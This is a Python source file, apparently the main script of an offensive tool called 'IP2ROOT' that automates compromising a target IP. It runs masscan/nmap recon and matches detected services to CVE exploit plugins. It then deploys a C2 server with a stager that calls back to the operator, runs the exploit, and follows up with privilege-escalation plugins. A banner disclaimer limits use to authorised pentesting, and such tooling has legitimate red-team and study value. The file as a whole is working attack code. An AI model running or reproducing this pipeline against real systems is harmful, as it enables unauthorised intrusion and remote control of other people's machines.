import os
import sys
import socket
import argparse
import c2.c2 as c2
import configparser
from core import privesc
from core.utils import *
import core.recon as recon
from pyfiglet import Figlet
import core.report as report
import core.constants as constants
from multiprocessing import Process
from plugins.initial_access import *


def read_plugins_configs() -> dict:
    """
    Read all the plugins config files
    """
    config = configparser.ConfigParser()
    current_dir = os.path.dirname(os.path.abspath(__file__))
    initial_plugins_path = os.path.join(current_dir, constants.PLUGINS_DIR, constants.INITIAL_ACCESS_PLUGINS_DIR)
    configs = dict()
    for f in os.listdir(initial_plugins_path):
        if f.endswith('.ini'):
            config.read(os.path.join(initial_plugins_path, f))
            configs[config['DEFAULT']['plugin_name']] = { 
                'service' : config['DEFAULT']['service'],
                'versions' : config['DEFAULT']['versions'],
                'extrainfo' : config['DEFAULT']['extrainfo'],
                'http_title' : config['DEFAULT']['http-title'],  
                'CVE' : config['DEFAULT']['CVE'], 
                'CVSSv3' : config['DEFAULT']['CVSSv3'],
                'OS' : config['DEFAULT']['OS'] 
            }
    return configs


def run_initial_access_plugin(plugin_name: str, plugin_config: list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str, container_id: str, token: str) -> None:
    """
    Run an initial access plugin
    """
    try:
        print('[+] Running plugin {}'.format(plugin_name))
        stager = c2.get_stager(safe_get(plugin_config, 'OS'), token)
        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port, stager)
        if res is True:
            print('[+] Exploit was successful !')
            if compromission_recap_file_name:
                report.write_report(compromission_recap_file_name, plugin_config, target_ip, target_port)
            privesc.test_plugins(container_id)
    except Exception as e:
        print(e)


def extract_ip() -> None | str:
    """
    Return the local IP of the machine
    """
    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:       
        st.connect(('10.255.255.255', 1))
        IP = st.getsockname()[0]
    except Exception as e:
        print(e)
        sys.exit()
    finally:
        st.close()
    return IP


def parse_cli_args() -> None | object:
    '''
    Parse CLI arguments
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
    parser.add_argument('-l', '--local_ip', type=str, help='local ip', required=False)
    parser.add_argument('-lp', '--local_port', default=9001, type=int, help='local port', required=False)
    parser.add_argument('-rp', '--target_ports', type=str, required=False, help='Ports to scan, if option is not selected all ports will be scanned')
    parser.add_argument('-o', '--output', type=str, help='output report file name (markdown format)', required=False)
    parser.add_argument('-m', '--masscan', action='store_true', help='Run masscan on the targets before nmap')
    parser.add_argument('-f', '--fast-scan', action='store_true', help='increase masscan\'s rate limit to 100000, be careful with this option it might flood the network', required=False)

    return parser.parse_args()


def banner_display() -> None:
    '''
    Display banner at the start
    '''
    f = Figlet(font='slant')
    print(f.renderText('IP2ROOT'))
    print('\033[1m' + 'By 0xblank, Steels, Lebansx, Koko' + '\033[0m\n')
    print('\033[1m' + '/!\ DISCLAIMER /!\ ' + '\033[0m')
    print("The tool has been created to help pentesters and redteamers and should only be used against targets you have rights on. We are not responsible of the actions done by your usage of the tool.\n")


def main() -> None | str:
    banner_display()

    # get plugins config
    configs = read_plugins_configs()
    # get CLI arguments
    args = parse_cli_args()

    if args.local_ip == None:
        LOCAL_IP = extract_ip()
    else:
        LOCAL_IP = args.local_ip

    # validate IP addresses' format
    validate_ip_address(LOCAL_IP)
    
    # start initial scanning
    no_ports_open = True
    if args.masscan:
        res_masscan = recon.masscan_scan(args.target_ip, args.fast_scan, args.target_ports)
        for target, ports in res_masscan.items():
            if len(ports) > 0:
                no_ports_open = False
                break
        if no_ports_open:
            sys.exit('[-] Error: No open ports found by masscan')
        res_recon = recon.nmap_scan(res_masscan)
    else:
        if args.target_ports:
            nmap_input = {args.target_ip:[args.target_ports]}
        else:
            nmap_input = {args.target_ip:['-']}
        res_recon = recon.nmap_scan(nmap_input)
        for ports in res_recon:
            if len(ports) > 0:
                no_ports_open = False
                break
        if no_ports_open:
            sys.exit('[-] Error: No open ports found by nmap')

    # deploy c2 and start client
    c2_infos = c2.c2(LOCAL_IP)
    c2.get_starkiller()
    privesc.plugins(c2_infos[0], c2_infos[2])

    
    # Search a compatible exploit and start it
    for target in res_recon:
        for i in target:
            print('[+] Looking for exploits for port {}'.format(i['port']))
            exploit_available = False
            for plugin_name, values in configs.items():
                if ((safe_get(i, 'product') and safe_get(i, 'product') == safe_get(values, 'service')) and (safe_get(i,'version') and safe_get(i, 'version') in safe_get(values, 'versions'))) \
                or (safe_get(i,'extrainfo') and safe_get(i, 'extrainfo') == safe_get(values, 'extrainfo')) \
                or (safe_get(i, 'http_title') and safe_get(values, 'http_title') and safe_get(values, 'http_title') in safe_get(i, 'http_title')):
                    exploit_available = True
                    target_port = i['port']
                    exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output, c2_infos[0], c2_infos[1]))
                    exploit_process.start()
                    exploit_process.join()
            if not exploit_available:
                print('[-] No exploit available for this port')
        if args.output :
            print("[+] Report available in {}".format(args.output))
        else : 
            print("[-] No output file provided for a report, --output <filename.md> allows to create a report")

if __name__ == '__main__':
    main()